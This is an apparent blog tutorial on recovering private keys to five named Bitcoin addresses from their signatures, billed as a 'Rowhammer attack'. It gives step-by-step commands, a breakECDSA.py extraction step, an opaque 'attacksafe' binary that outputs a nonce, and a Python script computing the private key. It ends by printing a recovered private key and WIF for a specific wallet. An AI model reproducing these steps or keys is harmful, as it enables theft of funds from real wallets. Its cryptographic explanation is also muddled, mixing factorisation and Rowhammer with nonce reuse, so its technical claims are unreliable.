<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/019-1-1024x576.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1122"></figure></div>


<p></p>

<p>The biggest cryptographic strength of the Bitcoin cryptocurrency is a&nbsp;<a href="https://cryptodeep.ru/doc/Computational_Discrete_Mathematics.pdf" target="_blank" rel="noreferrer noopener">computational method in discrete mathematics</a>&nbsp;that takes the problem of factorization of large integers and the problem of hidden numbers&nbsp;<code>(HNP)</code>in the Bitcoin signature transaction as a basis&nbsp;<code>ECDSA</code>.<br>

---

* Tutorial: https://youtu.be/lfYPcXPzLjE
* Tutorial: https://cryptodeeptech.ru/rowhammer-attack

---
	
In this article, we will apply Signature Fault Differential Analysis&nbsp;<code>ECDSA</code>and derive a private key from a transaction for five different Bitcoin Wallets.<br>
	
<code>Rowhammer Attack on Bitcoin</code>, allows us to efficiently find all zeros for normalized polynomials modulo a certain value, and we adapt this method to a signature algorithm,&nbsp;<code>ECDSA</code>more precisely, to critically vulnerable transactions in the Bitcoin blockchain.<br>We will apply multiplication by different powers of the same element of the finite field, which, oddly enough, can coincide and give us a certain function over the finite field, which can be specified using&nbsp;<a href="https://en.wikipedia.org/wiki/Lagrange_polynomial" target="_blank" rel="noreferrer noopener">the Lagrange interpolation polynomial</a>&nbsp;.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-107.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1156"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-108-1.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1162"></figure></div>


<p>The theoretical part of this attack can be found in the article from the list of popular Bitcoin attacks:&nbsp;<a href="https://attacksafe.ru/rowhammer-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>“Rowhammer Attack on Bitcoin”</strong></a></p>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://attacksafe.ru/rowhammer-attack-on-bitcoin" target="_blank" rel="noreferrer noopener"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/0_00003.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1127"></a><figcaption><strong><code><a href="https://attacksafe.ru/rowhammer-attack-on-bitcoin" target="_blank" rel="noreferrer noopener">www.attacksafe.ru/rowhammer-attack-on-bitcoin</a></code></strong></figcaption></figure></div>


<p>From our early&nbsp;<a href="https://cryptodeep.ru/publication/" target="_blank" rel="noreferrer noopener">publications,</a>&nbsp;we know that there are a lot of vulnerable and weak transactions in the Bitcoin blockchain, and in the process of our cryptanalysis, we found many Bitcoin Addresses where a large number of signatures&nbsp;<code>ECDSA</code>were made with the disclosure of the secret key&nbsp;<code>"K" (NONCE)</code>.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>As a result, knowing the secret key, we can accurately obtain the private key to the Bitcoin Wallet.</strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Consider five Bitcoin Addresses:</h2>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener">1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</a></strong></p><p><strong><a href="https://btc1.trezor.io/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener">18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</a></strong></p><p><strong><a href="https://btc1.trezor.io/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener">14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</a></strong></p><p><strong><a href="https://btc1.trezor.io/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener">17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</a></strong></p><p><strong><a href="https://btc1.trezor.io/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener">18vXv21kk8PfN4KRX5i19QvDRM855qheQ</a></strong></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Each Bitcoin Address made two critical vulnerable transactions:</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener">1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</a></strong></p><p><a href="https://btc1.trezor.io/tx/3c79fae7e31a32e12d55f2e0c91d88e11d6f16faa35f1ec85bd7d768a1c18846" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/3c79fae7e31a32e12d55f2e0c91d88e11d6f16faa35f1ec85bd7d768a1c18846</a></p><p><a href="https://btc1.trezor.io/tx/96c94c5b69c60ab4e3889b11fee54519fc6ff0f228f37554dd0dc766ab3909ef" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/96c94c5b69c60ab4e3889b11fee54519fc6ff0f228f37554dd0dc766ab3909ef</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-97-1024x203.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1133"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-98-1024x202.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1134"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener">18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</a></strong></p><p><a href="https://btc1.trezor.io/tx/3886796f1ba39ca9c673ab969d7c9366d2d69fe9d58726f580fa02e14cca3d29" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/3886796f1ba39ca9c673ab969d7c9366d2d69fe9d58726f580fa02e14cca3d29</a></p><p><a href="https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-99-1024x201.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1136"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-100-1024x202.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1138"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener">14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</a></strong></p><p><a href="https://btc1.trezor.io/tx/2f7422ffa8bd6311ee25bad9466f0e1d1feef24d32f1d60d7396080a12791f6b" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/2f7422ffa8bd6311ee25bad9466f0e1d1feef24d32f1d60d7396080a12791f6b</a></p><p><a href="https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-101-1024x202.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1140"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-102-1024x206.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1142"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener">17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</a></strong></p><p><a href="https://btc1.trezor.io/tx/18dcc93cea01e4bbd41a4e648ca6088fce67bb0a8e2cc231e42978dcdffd1591" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/18dcc93cea01e4bbd41a4e648ca6088fce67bb0a8e2cc231e42978dcdffd1591</a></p><p><a href="https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-103-1024x204.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1144"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-104-1024x204.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1146"></figure>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener">18vXv21kk8PfN4KRX5i19QvDRM855qheQ</a></strong></p><p><a href="https://btc1.trezor.io/tx/d415bede55c2a598487d708bd2a6e6c2e616eb8db3de844f7ad0298871c13c37" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/d415bede55c2a598487d708bd2a6e6c2e616eb8db3de844f7ad0298871c13c37</a></p><p><a href="https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-105-1024x203.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1148"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-106-1024x203.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1150"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Disclosure of the secret key “K” (NONCE) in the Bitcoin blockchain</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Open&nbsp;&nbsp;<strong><a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener">[TerminalGoogleColab]</a></strong>&nbsp;.</p>



<p>Implementing an Efficient&nbsp;<a href="https://attacksafe.ru/rowhammer-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>Rowhammer Attack</strong></a>&nbsp;Algorithm Using Our&nbsp;<a href="https://github.com/demining/CryptoDeepTools/tree/main/15RowhammerAttack" target="_blank" rel="noreferrer noopener"><strong>15RowhammerAttack Repository</strong></a></p>



<pre class="wp-block-code"><code>git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/15RowhammerAttack/

ls</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-110-1024x473.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1173"></figure>



<h3>Install all the packages we need</h3>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-11.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-687"><figcaption><strong><code>requirements.txt</code></strong></figcaption></figure>



<pre class="wp-block-code"><code>wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

sudo python2 get-pip.py

pip2 install -r requirements.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-111-1024x448.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1175"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-112-1024x452.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1177"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-114-1024x452.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1179"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2></h2>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener">1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</a></strong></p><p><a href="https://btc1.trezor.io/tx/3c79fae7e31a32e12d55f2e0c91d88e11d6f16faa35f1ec85bd7d768a1c18846" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/3c79fae7e31a32e12d55f2e0c91d88e11d6f16faa35f1ec85bd7d768a1c18846</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-115-1024x145.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1181"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001cb9a792b88760ad20c67047c06d016ba4a069d036c4fbc5c09a8055fe786580f300000006a4730440220331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc6702200bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff401210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001cb9a792b88760ad20c67047c06d016ba4a069d036c4fbc5c09a8055fe786580f300000006a4730440220331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc6702200bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff401210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-116-1024x306.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1183"></figure>



<pre class="wp-block-code"><code>R = 0x331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc67
S = 0x0bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff4
Z = 0x9d86bea51385f6a56835d0148e7f23a353605bab339127e800112307e6727d2d</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>To implement the attack and get the secret key, we will use the&nbsp;</strong><strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener">“ATTACKSAFE SOFTWARE” software</a></strong></p>



<figure class="wp-block-image"><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-14.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-705"></a><figcaption><strong><code>www.attacksafe.ru/software</code></strong></figcaption></figure>



<h2>Access rights:</h2>



<pre class="wp-block-code"><code>chmod +x attacksafe</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-118.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1188"></figure>



<h2>Application:</h2>



<pre class="wp-block-code"><code>./attacksafe -help</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-119.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1190"></figure>



<pre class="wp-block-code"><code>  -version:  software version 
  -list:     list of bitcoin attacks
  -tool:     indicate the attack
  -gpu:      enable gpu
  -time:     work timeout
  -server:   server mode
  -port:     server port
  -open:     open file
  -save:     save file
  -search:   vulnerability search
  -stop:     stop at mode
  -max:      maximum quantity in mode
  -min:      minimum quantity per mode
  -speed:    boost speed for mode
  -range:    specific range
  -crack:    crack mode
  -field:    starting field
  -point:    starting point
  -inject:   injection regimen
  -decode:   decoding mode</code></pre>



<pre class="wp-block-code"><code>./attacksafe -version</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-120.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1193"></figure>



<p><code>"ATTACKSAFE SOFTWARE"</code>includes all popular attacks on Bitcoin.</p>



<h2>Let’s run a list of all attacks:</h2>



<pre class="wp-block-code"><code>./attacksafe -list</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-121-1024x630.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1195"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-122-1024x676.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1196"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-123-1024x631.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1197"></figure>



<p>then choose<code>&nbsp;-tool: rowhammer_attack</code></p>



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001cb9a792b88760ad20c67047c06d016ba4a069d036c4fbc5c09a8055fe786580f300000006a4730440220331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc6702200bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff401210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-125-1024x275.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1200"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-126-1024x493.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1203"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x6251240a6cb656310dbd7f0da53a315ab88ec253352a5d5481ee08e977b6ef2d

RawTX = 0100000001cb9a792b88760ad20c67047c06d016ba4a069d036c4fbc5c09a8055fe786580f300000006a4730440220331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc6702200bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff401210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x6251240a6cb656310dbd7f0da53a315ab88ec253352a5d5481ee08e977b6ef2d</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To do this, install the&nbsp;<a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>&nbsp;elliptic curve library :</p>



<pre class="wp-block-code"><code>pip3 install ECPy</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-44-1024x335.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-968"></figure>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x6251240a6cb656310dbd7f0da53a315ab88ec253352a5d5481ee08e977b6ef2d</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-138-1024x90.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1231"></figure>



<p><code>(0x331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc67 , 0xc6efa8de714dd94d7b659d8935aa9036ada6a2b541a03360901fc195fd0e2cf6)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc67
S = 0x0bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff4
Z = 0x9d86bea51385f6a56835d0148e7f23a353605bab339127e800112307e6727d2d</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc67
point2gen  =   (0x331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc67 , 0xc6efa8de714dd94d7b659d8935aa9036ada6a2b541a03360901fc195fd0e2cf6)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x6251240a6cb656310dbd7f0da53a315ab88ec253352a5d5481ee08e977b6ef2d</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use the&nbsp;<em>Python</em>&nbsp;script:&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x6251240a6cb656310dbd7f0da53a315ab88ec253352a5d5481ee08e977b6ef2d
R = 0x331353fedfd6e4d6805fc1f06443ade552a43a43237fb6c3de3c7f0969b4cc67
S = 0x0bfec7e7d2ae249b3d69cd8d666b5ee833394af3b0703fa023579200d9ab2ff4
Z = 0x9d86bea51385f6a56835d0148e7f23a353605bab339127e800112307e6727d2d


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-128.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1208"></figure>



<p><code>PrivKey = aa35fda8f16d06ae02bdcf671e03035795a0b0ecbdae45098928f6587016a932</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o
WIF:  L2vaWmjh7XpV9AMWDjmNSGPQNEd4QG7YGAMMqPEmGSt8WSppysCV
HEX:  aa35fda8f16d06ae02bdcf671e03035795a0b0ecbdae45098928f6587016a932</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/001-2.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1236"></figure></div>


